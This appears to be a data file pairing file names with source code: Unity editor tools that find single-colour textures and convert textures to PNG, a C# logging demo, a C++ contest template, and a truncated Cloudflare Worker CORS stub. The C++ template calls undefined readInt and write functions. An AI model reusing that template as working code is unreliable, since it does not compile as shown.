name,code
# - https://bit.ly/celery-reliability
# - https://denibertovic.com/posts/celery-best-practices/
# - https://medium.com/squad-engineering/celery-in-production-three-more-years-of-fixing-bugs-2ee462cef39f
# - https://engineering.instawork.com/celery-eta-tasks-demystified-424b836e4e94
# - https://blog.wolt.com/engineering/2021/09/15/5-tips-for-writing-production-ready-celery-tasks/
# - https://adamj.eu/tech/2020/02/03/common-celery-issues-on-django-projects/
# - https://blog.daftcode.pl/working-with-asynchronous-celery-tasks-lessons-learned-32bb7495586b
# - https://italux.medium.com/celery-rabbitmq-common-issues-a741a3800b30
# - https://stackoverflow.com/questions/66978028/application-impacts-of-celery-workers-running-with-the-without-heartbeat-fla
"
"SingleColorTextureDetector.cs
","using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using UnityEditor;
using UnityEngine;
using Object = UnityEngine.Object;


public class SingleColorTextureDetector : EditorWindow, IHasCustomMenu
{
 [Serializable]
 private class SaveData
 {
 public List<string> paths = new List<string>();
 }


 private const string LOW_RES_DUMMY_TEXTURE_PATH = ""Assets/low_dummyy_texturee.png"";
 private const string HIGH_RES_DUMMY_TEXTURE_PATH = ""Assets/high_dummyy_texturee.png"";
 private const string SAVE_FILE_PATH = ""Library/SingleColorAssetDetector.json"";
 private const float BUTTON_DRAG_THRESHOLD_SQR = 600f;


 private readonly MethodInfo instanceIDFromGUID = typeof( AssetDatabase ).GetMethod( ""GetInstanceIDFromGUID"", BindingFlags.NonPublic | BindingFlags.Static );


 private List<string> results = new List<string>(); // This is not readonly so that it can be serialized


 private double lastClickTime;
 private string lastClickedPath;


 private readonly GUIContent buttonGUIContent = new GUIContent();
 private Vector2 buttonPressPosition;
 private Vector2 scrollPos;


 [MenuItem( ""Window/Single Color Texture Detector"" )]
 private static void Init()
 {
 SingleColorTextureDetector window = GetWindow<SingleColorTextureDetector>();
		window.titleContent = new GUIContent( ""Solid Textures"" );
		window.minSize = new Vector2( 200f, 150f );
		window.Show();
 }


 private void Awake()
 {
		LoadSession( null );
 }


 // Show additional options in the window's context menu
 public void AddItemsToMenu( GenericMenu menu )
 {
 if( results.Count > 0 )
			menu.AddItem( new GUIContent( ""Save To Clipboard"" ), false, () => GUIUtility.systemCopyBuffer = JsonUtility.ToJson( new SaveData() { paths = results }, true ) );
 else
			menu.AddDisabledItem( new GUIContent( ""Save To Clipboard"" ) );


 if( string.IsNullOrEmpty( GUIUtility.systemCopyBuffer ) )
			menu.AddDisabledItem( new GUIContent( ""Load From Clipboard"" ) );
 else
 {
			menu.AddItem( new GUIContent( ""Load From Clipboard"" ), false, () =>
 {
 string json = GUIUtility.systemCopyBuffer;
				LoadSession( json );
				SaveSession( json ); // If load succeeds, overwrite the saved session
 } );
 }
 }


 private void OnGUI()
 {
 Event ev = Event.current;
 scrollPos = GUILayout.BeginScrollView( scrollPos );


 // Calculate single color Textures
 if( GUILayout.Button( ""Refresh"" ) )
 {
 try
 {
 double startTime = EditorApplication.timeSinceStartup;


				CalculateSingleColorTextures();
				SaveSession( null );


				Debug.Log( ""Refreshed in "" + ( EditorApplication.timeSinceStartup - startTime ) + "" seconds."" );
 }
 catch( Exception e )
 {
				Debug.LogException( e );
 }
 finally
 {
				EditorUtility.ClearProgressBar();


 if( File.Exists( LOW_RES_DUMMY_TEXTURE_PATH ) )
					AssetDatabase.DeleteAsset( LOW_RES_DUMMY_TEXTURE_PATH );
 if( File.Exists( HIGH_RES_DUMMY_TEXTURE_PATH ) )
					AssetDatabase.DeleteAsset( HIGH_RES_DUMMY_TEXTURE_PATH );
 }


			GUIUtility.ExitGUI();
 }


 // Draw found results
 if( results.Count > 0 )
 {
			EditorGUILayout.HelpBox( ""- Double click a path to select the Texture asset\n- Right/middle click a path to hide it from the list"", MessageType.Info );


 for( int i = 0; i < results.Count; i++ )
 {
 Rect rect = EditorGUILayout.GetControlRect( false, EditorGUIUtility.singleLineHeight + 2f );
				rect.xMin += 3f;
				rect.xMax -= 3f;


 Rect iconRect = new Rect( rect.x, rect.y, rect.height, rect.height );
				rect.xMin += iconRect.width + 2f;


 Texture icon = AssetDatabase.GetCachedIcon( results[i] );
 if( icon )
					EditorGUI.DrawTextureTransparent( iconRect, icon );


 // Buttons must support 1) click and 2) drag & drop. The most reliable way is to simulate GUI.Button from scratch
				buttonGUIContent.text = results[i];
 int buttonControlID = GUIUtility.GetControlID( FocusType.Passive );
 switch( ev.GetTypeForControl( buttonControlID ) )
 {
 case EventType.MouseDown:
 if( rect.Contains( ev.mousePosition ) )
 {
							GUIUtility.hotControl = buttonControlID;
 buttonPressPosition = ev.mousePosition;
 }


 break;
 case EventType.MouseDrag:
 if( GUIUtility.hotControl == buttonControlID && ev.button == 0 && ( ev.mousePosition - buttonPressPosition ).sqrMagnitude >= BUTTON_DRAG_THRESHOLD_SQR )
 {
							GUIUtility.hotControl = 0;


 Object asset = AssetDatabase.LoadMainAssetAtPath( results[i] );
 if( asset )
 {
 // Credit: https://forum.unity.com/threads/editor-draganddrop-bug-system-needs-to-be-initialized-by-unity.219342/#post-1464056
								DragAndDrop.PrepareStartDrag();
								DragAndDrop.objectReferences = new Object[] { asset };
								DragAndDrop.StartDrag( ""DuplicateAssetDetector"" );
 }


							ev.Use();
 }


 break;
 case EventType.MouseUp:
 if( GUIUtility.hotControl == buttonControlID )
 {
							GUIUtility.hotControl = 0;


 if( rect.Contains( ev.mousePosition ) )
 {
 if( ev.button == 0 && File.Exists( results[i] ) )
 {
 // Ping clicked Texture
 double clickTime = EditorApplication.timeSinceStartup;
 if( clickTime - lastClickTime < 0.5f && lastClickedPath == results[i] )
 {
 if( !ev.control && !ev.command && !ev.shift )
											Selection.objects = new Object[] { AssetDatabase.LoadMainAssetAtPath( results[i] ) };
 else
 {
 // While holding CTRL, either add clicked asset to current selection or remove it from current selection
 Object asset = AssetDatabase.LoadMainAssetAtPath( results[i] );
 List<Object> selection = new List<Object>( Selection.objects );
 if( !selection.Remove( asset ) )
												selection.Add( asset );


											Selection.objects = selection.ToArray();
 }
 }
 else if( instanceIDFromGUID != null )
										EditorGUIUtility.PingObject( (int) instanceIDFromGUID.Invoke( null, new object[] { AssetDatabase.AssetPathToGUID( results[i] ) } ) );
 else
										EditorGUIUtility.PingObject( AssetDatabase.LoadMainAssetAtPath( results[i] ) );


 lastClickTime = clickTime;
 lastClickedPath = results[i];
 }
 else if( ev.button == 1 )
 {
 // Show an option to hide that Texture from the list
 int _i = i;
 GenericMenu menu = new GenericMenu();
									menu.AddItem( new GUIContent( ""Hide"" ), false, () => HideTexture( _i ) );
									menu.ShowAsContext();
 }
 else if( ev.button == 2 )
									HideTexture( i );
 }
 }
 break;
 case EventType.Repaint:
						EditorStyles.textField.Draw( rect, buttonGUIContent, buttonControlID );
 break;
 }


 if( ev.isMouse && GUIUtility.hotControl == buttonControlID )
					ev.Use();
 }


			GUILayout.Space( 1f );
 }


		GUILayout.EndScrollView();
 }


 private void CalculateSingleColorTextures()
 {
 // Dummy Texture is used to read Textures' pixels
		CreateDummyTexture( LOW_RES_DUMMY_TEXTURE_PATH, 32 );
		CreateDummyTexture( HIGH_RES_DUMMY_TEXTURE_PATH, 1024 );


		results.Clear();


 string[] textureGUIDs = AssetDatabase.FindAssets( ""t:Texture"" );
 if( textureGUIDs.Length == 0 )
 return;


 string pathsLengthStr = ""/"" + textureGUIDs.Length.ToString();
 float progressMultiplier = 1f / textureGUIDs.Length;


 for( int i = 0; i < textureGUIDs.Length; i++ )
 {
 if( i % 15 == 0 && EditorUtility.DisplayCancelableProgressBar( ""Please wait..."", string.Concat( ""Searching: "", ( i + 1 ).ToString(), pathsLengthStr ), ( i + 1 ) * progressMultiplier ) )
 throw new Exception( ""Search aborted"" );


 if( string.IsNullOrEmpty( textureGUIDs[i] ) )
 continue;


 string path = AssetDatabase.GUIDToAssetPath( textureGUIDs[i] );
 if( string.IsNullOrEmpty( path ) || !path.StartsWith( ""Assets/"" ) || path == LOW_RES_DUMMY_TEXTURE_PATH || path == HIGH_RES_DUMMY_TEXTURE_PATH )
 continue;


 // Happens for Font Assets' Textures, for example
 if( !typeof( Texture ).IsAssignableFrom( AssetDatabase.GetMainAssetTypeAtPath( path ) ) )
 continue;


 // First downscale the Texture to 32 pixels for performance reasons, then downscale it to 1024 pixels to verify the result
 if( CheckTextureAtPath( path, LOW_RES_DUMMY_TEXTURE_PATH ) && CheckTextureAtPath( path, HIGH_RES_DUMMY_TEXTURE_PATH ) )
				results.Add( path );
 }
 }


 // Creates dummy Texture asset that will be used to read Textures' pixels
 private void CreateDummyTexture( string path, int maxSize )
 {
 if( !File.Exists( path ) )
 {
			File.WriteAllBytes( path, new Texture2D( 2, 2 ).EncodeToPNG() );
			AssetDatabase.ImportAsset( path, ImportAssetOptions.ForceUpdate );
 }


 TextureImporter textureImporter = AssetImporter.GetAtPath( path ) as TextureImporter;
		textureImporter.maxTextureSize = maxSize;
		textureImporter.isReadable = true;
		textureImporter.filterMode = FilterMode.Point;
		textureImporter.mipmapEnabled = false;
		textureImporter.alphaSource = TextureImporterAlphaSource.FromInput;
		textureImporter.alphaIsTransparency = true;
		textureImporter.textureCompression = TextureImporterCompression.Uncompressed;
		textureImporter.SaveAndReimport();
 }


 // Checks if downsized Texture's pixels are all same
 private bool CheckTextureAtPath( string texturePath, string dummyTexturePath )
 {
		File.Copy( texturePath, dummyTexturePath, true );
		AssetDatabase.ImportAsset( dummyTexturePath, ImportAssetOptions.ForceUpdate );


 Texture2D texture = AssetDatabase.LoadAssetAtPath<Texture2D>( dummyTexturePath );
 if( !texture ) // RenderTextures, for example, are also Textures but not Texture2Ds
 return false;


		Color32[] colors = texture.GetPixels32();
 Color32 color = colors[0];
 for( int i = 1; i < colors.Length; i++ )
 {
 Color32 color2 = colors[i];
 if( color2.r != color.r || color2.g != color.g || color2.b != color.b || color2.a != color.a )
 return false;
 }


 return true;
 }


 // Hides the Texture at the specified index from the results
 private void HideTexture( int textureIndex )
 {
		results.RemoveAt( textureIndex );


		SaveSession( null );
		Repaint();
 }


 // Saves current session to file
 private void SaveSession( string json )
 {
 if( string.IsNullOrEmpty( json ) )
 json = JsonUtility.ToJson( new SaveData() { paths = results }, false );


		File.WriteAllText( SAVE_FILE_PATH, json );
 }


 // Restores previous session
 private void LoadSession( string json )
 {
 if( string.IsNullOrEmpty( json ) )
 {
 if( !File.Exists( SAVE_FILE_PATH ) )
 return;


 json = File.ReadAllText( SAVE_FILE_PATH );
 }


 SaveData saveData = JsonUtility.FromJson<SaveData>( json );


 // Remove non-existent paths
 for( int i = saveData.paths.Count - 1; i >= 0; i-- )
 {
 if( !File.Exists( saveData.paths[i] ) )
				saveData.paths.RemoveAt( i );
 }


 results = saveData.paths;
		Repaint();
 }
}
==<SEPERATOR>==
ConvertTexturesToPNG.cs
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using UnityEditor;
using UnityEngine;
using Debug = UnityEngine.Debug;
using Object = UnityEngine.Object;


public class ConvertTexturesToPNG : EditorWindow
{
 private const string DUMMY_TEXTURE_PATH = ""Assets/convert_dummyy_texturee.png"";
 private const bool REMOVE_MATTE_FROM_PSD_BY_DEFAULT = true;


 private readonly GUIContent[] maxTextureSizeStrings = { new GUIContent( ""32"" ), new GUIContent( ""64"" ), new GUIContent( ""128"" ), new GUIContent( ""256"" ), new GUIContent( ""512"" ), new GUIContent( ""1024"" ), new GUIContent( ""2048"" ), new GUIContent( ""4096"" ), new GUIContent( ""8192"" ), new GUIContent( ""16384"" ) };
 private readonly int[] maxTextureSizeValues = { 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384 };


 private readonly GUIContent rootPathContent = new GUIContent( ""Root Path:"", ""Textures inside this folder (recursive) will be converted"" );
 private readonly GUIContent textureExtensionsContent = new GUIContent( ""Textures to Convert:"", ""Only Textures with these extensions will be converted (';' separated)"" );
 private readonly GUIContent excludedDirectoriesContent = new GUIContent( ""Excluded Directories:"", ""Textures inside these directories won't be converted (';' separated)"" );
 private readonly GUIContent keepOriginalFilesContent = new GUIContent( ""Keep Original Files:"", ""If selected, original Texture files won't be deleted after the conversion"" );
 private readonly GUIContent maxTextureSizeContent = new GUIContent( ""Max Texture Size:"", ""Textures larger than this size will be downscaled to this size"" );
 private readonly GUIContent optiPNGPathContent = new GUIContent( ""OptiPNG Path (Optional):"", ""If 'optipng.exe' is selected, it will be used to reduce the image sizes even further (roughly 20%) but the process will take more time"" );
 private readonly GUIContent optiPNGOptimizationContent = new GUIContent( ""OptiPNG Optimization:"", ""Determines how many trials OptiPNG will do to optimize the image sizes. As this value increases, computation time will increase exponentially"" );
 private readonly GUIContent optiPNGURL = new GUIContent( ""..."", ""http://optipng.sourceforge.net/"" );
 private readonly GUILayoutOption GL_WIDTH_25 = GUILayout.Width( 25f );


 private string rootPath = """";
 private string textureExtensions = "".tga;.psd;.tiff;.tif;.bmp"";
 private string excludedDirectories = """";
 private bool keepOriginalFiles = false;
 private int maxTextureSize = 8192;
 private string optiPNGPath = """";
 private int optiPNGOptimization = 3;


 private Vector2 scrollPos;


 [MenuItem( ""Window/Convert Textures to PNG"" )]
 private static void Init()
 {
 ConvertTexturesToPNG window = GetWindow<ConvertTexturesToPNG>();
		window.titleContent = new GUIContent( ""Convert to PNG"" );
		window.minSize = new Vector2( 285f, 160f );
		window.Show();
 }


 private void OnEnable()
 {
 // By default, Root Path points to this project's Assets folder
 if( string.IsNullOrEmpty( rootPath ) )
 rootPath = Application.dataPath;
 }


 private void OnGUI()
 {
 scrollPos = GUILayout.BeginScrollView( scrollPos );


 rootPath = PathField( rootPathContent, rootPath, true, ""Choose target directory"" );
 textureExtensions = EditorGUILayout.TextField( textureExtensionsContent, textureExtensions );
 excludedDirectories = EditorGUILayout.TextField( excludedDirectoriesContent, excludedDirectories );
 keepOriginalFiles = EditorGUILayout.Toggle( keepOriginalFilesContent, keepOriginalFiles );
 maxTextureSize = EditorGUILayout.IntPopup( maxTextureSizeContent, maxTextureSize, maxTextureSizeStrings, maxTextureSizeValues );
 optiPNGPath = PathField( optiPNGPathContent, optiPNGPath, false, ""Choose optipng.exe path"", optiPNGURL );
 if( !string.IsNullOrEmpty( optiPNGPath ) )
 {
			EditorGUI.indentLevel++;
 optiPNGOptimization = EditorGUILayout.IntSlider( optiPNGOptimizationContent, optiPNGOptimization, 2, 7 );
			EditorGUI.indentLevel--;
 }


		EditorGUILayout.Space();


 // Convert Textures to PNG
 if( GUILayout.Button( ""Convert to PNG!"" ) )
 {
 double startTime = EditorApplication.timeSinceStartup;


 List<string> convertedPaths = new List<string>( 128 );
 long originalTotalSize = 0L, convertedTotalSize = 0L, convertedTotalSizeOptiPNG = 0L;


 try
 {
 rootPath = rootPath.Trim();
 excludedDirectories = excludedDirectories.Trim();
 textureExtensions = textureExtensions.ToLowerInvariant().Replace( "".png"", """" ).Trim();
 optiPNGPath = optiPNGPath.Trim();


 if( rootPath.Length == 0 )
 rootPath = Application.dataPath;


 if( optiPNGPath.Length > 0 && !File.Exists( optiPNGPath ) )
					Debug.LogWarning( ""OptiPNG doesn't exist at path: "" + optiPNGPath );


 string[] paths = FindTexturesToConvert();
 string pathsLengthStr = paths.Length.ToString();
 float progressMultiplier = paths.Length > 0 ? ( 1f / paths.Length ) : 1f;


				CreateDummyTexture(); // Dummy Texture is used while reading Textures' pixels


 for( int i = 0; i < paths.Length; i++ )
 {
 if( EditorUtility.DisplayCancelableProgressBar( ""Please wait..."", string.Concat( ""Converting: "", ( i + 1 ).ToString(), ""/"", pathsLengthStr ), ( i + 1 ) * progressMultiplier ) )
 throw new Exception( ""Conversion aborted"" );


 string pngFile = Path.ChangeExtension( paths[i], "".png"" );
 string pngMetaFile = pngFile + "".meta"";
 string originalMetaFile = paths[i] + "".meta"";


 bool isPSDImage = Path.GetExtension( paths[i] ).ToLowerInvariant() == "".psd"";


 // Make sure to respect PSD assets' ""Remove Matte (PSD)"" option
 if( isPSDImage )
 {
 bool removeMatte = REMOVE_MATTE_FROM_PSD_BY_DEFAULT;


 if( File.Exists( originalMetaFile ) )
 {
 const string removeMatteOption = ""pSDRemoveMatte: "";


 string metaContents = File.ReadAllText( originalMetaFile );
 int removeMatteIndex = metaContents.IndexOf( removeMatteOption );
 if( removeMatteIndex >= 0 )
 removeMatte = metaContents[removeMatteIndex + removeMatteOption.Length] != '0';
 }


 SerializedProperty removeMatteProp = new SerializedObject( AssetImporter.GetAtPath( DUMMY_TEXTURE_PATH ) ).FindProperty( ""m_PSDRemoveMatte"" );
 if( removeMatteProp != null && removeMatteProp.boolValue != removeMatte )
 {
							removeMatteProp.boolValue = removeMatte;
							removeMatteProp.serializedObject.ApplyModifiedPropertiesWithoutUndo();
 }
 }


 // Temporarily copy the image file to Assets folder to create a read-write enabled Texture from it
					File.Copy( paths[i], DUMMY_TEXTURE_PATH, true );
					AssetDatabase.ImportAsset( DUMMY_TEXTURE_PATH, ImportAssetOptions.ForceUpdate );


 // Convert the Texture to PNG and save it
 byte[] pngBytes = AssetDatabase.LoadAssetAtPath<Texture2D>( DUMMY_TEXTURE_PATH ).EncodeToPNG();
					File.WriteAllBytes( pngFile, pngBytes );


 originalTotalSize += new FileInfo( paths[i] ).Length;
 convertedTotalSize += new FileInfo( pngFile ).Length;


 // Run OptiPNG to optimize the PNG
 if( optiPNGPath.Length > 0 && File.Exists( optiPNGPath ) )
 {
 try
 {
							Process.Start( new ProcessStartInfo( optiPNGPath )
 {
 Arguments = string.Concat( ""-o "", optiPNGOptimization.ToString(), "" \"""", pngFile, ""\"""" ),
 CreateNoWindow = true,
 UseShellExecute = false
 } ).WaitForExit();
 }
 catch( Exception e )
 {
							Debug.LogException( e );
 }


 convertedTotalSizeOptiPNG += new FileInfo( pngFile ).Length;
 }


 // If .meta file exists, copy it to PNG image
 if( File.Exists( originalMetaFile ) )
 {
						File.Copy( originalMetaFile, pngMetaFile, true );


 // Try changing original meta file's GUID to avoid collisions with PNG (Credit: https://gist.github.com/ZimM-LostPolygon/7e2f8a3e5a1be183ac19)
 if( keepOriginalFiles )
 {
 string metaContents = File.ReadAllText( originalMetaFile );
 int guidIndex = metaContents.IndexOf( ""guid: "" );
 if( guidIndex >= 0 )
 {
 string guid = metaContents.Substring( guidIndex + 6, 32 );
 string newGuid = Guid.NewGuid().ToString( ""N"" );
 metaContents = metaContents.Replace( guid, newGuid );
								File.WriteAllText( originalMetaFile, metaContents );
 }
 }


 // Don't show ""Remote Matte (PSD)"" option for converted Textures
 if( isPSDImage )
 {
 string metaContents = File.ReadAllText( pngMetaFile );
 bool modifiedMeta = false;


 if( metaContents.Contains( ""pSDShowRemoveMatteOption: 1"" ) )
 {
 metaContents = metaContents.Replace( ""pSDShowRemoveMatteOption: 1"", ""pSDShowRemoveMatteOption: 0"" );
 modifiedMeta = true;
 }
 if( metaContents.Contains( ""pSDRemoveMatte: 1"" ) )
 {
 metaContents = metaContents.Replace( ""pSDRemoveMatte: 1"", ""pSDRemoveMatte: 0"" );
 modifiedMeta = true;
 }


 if( modifiedMeta )
								File.WriteAllText( pngMetaFile, metaContents );
 }
 }


 if( !keepOriginalFiles )
 {
						File.Delete( paths[i] );


 if( File.Exists( originalMetaFile ) )
							File.Delete( originalMetaFile );
 }


					convertedPaths.Add( paths[i] );
 }
 }
 catch( Exception e )
 {
				Debug.LogException( e );
 }
 finally
 {
				EditorUtility.ClearProgressBar();


 if( File.Exists( DUMMY_TEXTURE_PATH ) )
					AssetDatabase.DeleteAsset( DUMMY_TEXTURE_PATH );


 // Force Unity to import PNG images (otherwise we'd have to minimize Unity and then maximize it)
				AssetDatabase.Refresh();


 // Print information to Console
 StringBuilder sb = new StringBuilder( 100 + convertedPaths.Count * 75 );
				sb.Append( ""Converted "" ).Append( convertedPaths.Count ).Append( "" Texture(s) to PNG in "" ).Append( ( EditorApplication.timeSinceStartup - startTime ).ToString( ""F2"" ) ).Append( "" seconds ("" ).
 Append( EditorUtility.FormatBytes( originalTotalSize ) ).Append( "" -> "" ).Append( EditorUtility.FormatBytes( convertedTotalSize ) );


 if( convertedTotalSizeOptiPNG > 0L )
					sb.Append( "" -> "" ).Append( EditorUtility.FormatBytes( convertedTotalSizeOptiPNG ) ).Append( "" with OptiPNG"" );


				sb.AppendLine( ""):"" );
 for( int i = 0; i < convertedPaths.Count; i++ )
					sb.Append( ""- "" ).AppendLine( convertedPaths[i] );


				Debug.Log( sb.ToString() );
 }
 }


		GUILayout.EndScrollView();
 }


 private string PathField( GUIContent label, string path, bool isDirectory, string title, GUIContent downloadURL = null )
 {
		GUILayout.BeginHorizontal();
 path = EditorGUILayout.TextField( label, path );
 if( GUILayout.Button( ""o"", GL_WIDTH_25 ) )
 {
 string selectedPath = isDirectory ? EditorUtility.OpenFolderPanel( title, """", """" ) : EditorUtility.OpenFilePanel( title, """", ""exe"" );
 if( !string.IsNullOrEmpty( selectedPath ) )
 path = selectedPath;


			GUIUtility.keyboardControl = 0; // Remove focus from active text field
 }
 if( downloadURL != null && GUILayout.Button( downloadURL, GL_WIDTH_25 ) )
			Application.OpenURL( downloadURL.tooltip );
		GUILayout.EndHorizontal();


 return path;
 }


 private string[] FindTexturesToConvert()
 {
 HashSet<string> texturePaths = new HashSet<string>();
 HashSet<string> targetExtensions = new HashSet<string>( textureExtensions.Split( ';' ) );


 // Get directories to exclude
 string[] excludedPaths = excludedDirectories.Split( ';' );
 for( int i = 0; i < excludedPaths.Length; i++ )
 {
			excludedPaths[i] = excludedPaths[i].Trim();
 if( excludedPaths[i].Length == 0 )
				excludedPaths[i] = ""NULL/"";
 else
 {
				excludedPaths[i] = Path.GetFullPath( excludedPaths[i] );


 // Make sure excluded directory paths end with directory separator char
 if( Directory.Exists( excludedPaths[i] ) && !excludedPaths[i].EndsWith( Path.DirectorySeparatorChar.ToString() ) )
					excludedPaths[i] += Path.DirectorySeparatorChar;
 }
 }


 // Iterate through all files in Root Path
 string[] allFiles = Directory.GetFiles( rootPath, ""*.*"", SearchOption.AllDirectories );
 for( int i = 0; i < allFiles.Length; i++ )
 {
 // Only process filtered image files
 if( targetExtensions.Contains( Path.GetExtension( allFiles[i] ).ToLowerInvariant() ) )
 {
 bool isExcluded = false;
 if( excludedPaths.Length > 0 )
 {
 // Make sure the image file isn't part of an excluded directory
 string fileFullPath = Path.GetFullPath( allFiles[i] );
 for( int j = 0; j < excludedPaths.Length; j++ )
 {
 if( fileFullPath.StartsWith( excludedPaths[j] ) )
 {
 isExcluded = true;
 break;
 }
 }
 }


 if( !isExcluded )
					texturePaths.Add( allFiles[i] );
 }
 }


 string[] result = new string[texturePaths.Count];
		texturePaths.CopyTo( result );


 return result;
 }


 // Creates dummy Texture asset that will be used to read Textures' pixels
 private void CreateDummyTexture()
 {
 if( !File.Exists( DUMMY_TEXTURE_PATH ) )
 {
			File.WriteAllBytes( DUMMY_TEXTURE_PATH, new Texture2D( 2, 2 ).EncodeToPNG() );
			AssetDatabase.ImportAsset( DUMMY_TEXTURE_PATH, ImportAssetOptions.ForceUpdate );
 }


 TextureImporter textureImporter = AssetImporter.GetAtPath( DUMMY_TEXTURE_PATH ) as TextureImporter;
		textureImporter.maxTextureSize = maxTextureSize;
		textureImporter.isReadable = true;
		textureImporter.filterMode = FilterMode.Point;
		textureImporter.mipmapEnabled = false;
		textureImporter.alphaSource = TextureImporterAlphaSource.FromInput;
		textureImporter.npotScale = TextureImporterNPOTScale.None;
		textureImporter.textureCompression = TextureImporterCompression.Uncompressed;
		textureImporter.SaveAndReimport();
 }
}
"
"ConsoleDiLoggingTests.cs
","using Logging;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;


var builder = Host.CreateDefaultBuilder(args);


builder
 .ConfigureLogging(logging => logging
 .ClearProviders()
 .AddConsole());


builder
 .ConfigureServices(services => services
 .AddScoped<LogTest>()
 .AddSingleton<IWorkerService, WorkerService>());


var app = builder.Build();


var worker = ActivatorUtilities.CreateInstance<Worker>(app.Services);
worker.WorkerTest($""Hello from {nameof(worker)}!"");


var logTest = ActivatorUtilities.CreateInstance<LogTest>(app.Services);
logTest.LogMessage($""Hello from {nameof(logTest)}!"");


internal class Worker(IWorkerService workerService)
{
 public void WorkerTest(string message) => workerService.WorkerServiceTest(message);
}


internal interface IWorkerService
{
 void WorkerServiceTest(string message);
}


internal class WorkerService(LogTest logTest) : IWorkerService
{
 public void WorkerServiceTest(string message) => logTest.LoggerTest(message);
}


namespace Logging
{
 public partial class LogTest(ILogger<LogTest> logger)
 {
 // ReSharper disable once ReplaceWithPrimaryConstructorParameter
 private readonly ILogger<LogTest> logger = logger;


 public void LoggerTest(string message) => LogMessage(message);


 [LoggerMessage(Level = LogLevel.Information, Message = ""Test log: {message}"")]
 public partial void LogMessage(string message);
 }
}
"
"CPP_Template.cpp
","#include <bits/stdc++.h>
using namespace std;


/* clang-format off */


/* TYPES  */
#define ll long long
#define pii pair<int, int>
#define pll pair<long long, long long>
#define vi vector<int>
#define vll vector<long long>
#define mii map<int, int>
#define si set<int>
#define sc set<char>


/* FUNCTIONS */
#define f(i,s,e) for(long long int i=s;i<e;i++)
#define cf(i,s,e) for(long long int i=s;i<=e;i++)
#define rf(i,e,s) for(long long int i=e-1;i>=s;i--)
#define pb push_back
#define eb emplace_back


/* PRINTS */
template <class T>
void print_v(vector<T> &v) { cout << ""{""; for (auto x : v) cout << x << "",""; cout << ""\b}""; }


/* UTILS */
#define MOD 1000000007
#define PI 3.1415926535897932384626433832795
#define read(type) readInt<type>()
ll min(ll a,int b) { if (a<b) return a; return b; }
ll min(int a,ll b) { if (a<b) return a; return b; }
ll max(ll a,int b) { if (a>b) return a; return b; }
ll max(int a,ll b) { if (a>b) return a; return b; }
ll gcd(ll a,ll b) { if (b==0) return a; return gcd(b, a%b); }
ll lcm(ll a,ll b) { return a/gcd(a,b)*b; }
string to_upper(string a) { for (int i=0;i<(int)a.size();++i) if (a[i]>='a' && a[i]<='z') a[i]-='a'-'A'; return a; }
string to_lower(string a) { for (int i=0;i<(int)a.size();++i) if (a[i]>='A' && a[i]<='Z') a[i]+='a'-'A'; return a; }
bool prime(ll a) { if (a==1) return 0; for (int i=2;i<=round(sqrt(a));++i) if (a%i==0) return 0; return 1; }
void yes() { cout<<""YES\n""; }
void no() { cout<<""NO\n""; }


/*  All Required define Pre-Processors and typedef Constants */
typedef long int int32;
typedef unsigned long int uint32;
typedef long long int int64;
typedef unsigned long long int  uint64;




/* clang-format on */


/* Main()  function */
int main()
{


	#ifndef ONLINE_JUDGE
 freopen(""input.txt"",""r"",stdin);
 //freopen(""output.txt"",""w"",stdout);
	#endif


 int tc;
	tc = read(int);


 while(tc--){
 write(tc);
	}
 return 0;
}
/* Main() Ends Here */
==<SEPERATOR>==
cf-worker.js
// We support the GET, POST, HEAD, and OPTIONS methods from any origin,
// and allow any header on requests. These headers must be present
// on all responses to all CORS preflight requests. In practice, this means
// all responses to OPTIONS requests.
const corsHeaders = {
 ""Access-Control-Allow-Origin"": ""*"",
 ""Access-Control-Allow-Methods"": ""GET,HEAD,POST,OPTIONS"",
 ""Access-Control-Max-Age"": ""86400"",
}


// The URL for the remote third party API you want to fetch from
